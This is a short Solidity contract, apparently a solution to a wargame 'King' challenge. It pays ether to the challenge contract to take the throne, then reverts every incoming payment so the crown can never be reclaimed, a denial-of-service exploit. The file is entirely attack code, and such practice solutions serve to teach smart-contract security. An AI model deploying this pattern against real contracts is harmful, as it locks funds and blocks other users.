// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;
import "./King.sol";

contract KingHack {
    King public challenge;

    constructor(address challengeAddress) {
        challenge = King(payable(challengeAddress));
    }

    function attack() external payable {
        (bool success, ) = payable(address(challenge)).call{value: msg.value}(
            ""
        );
        require(success, "Call failed");
    }

    receive() external payable {
        require(false, "Can's steal my throne bro!");
    }
}
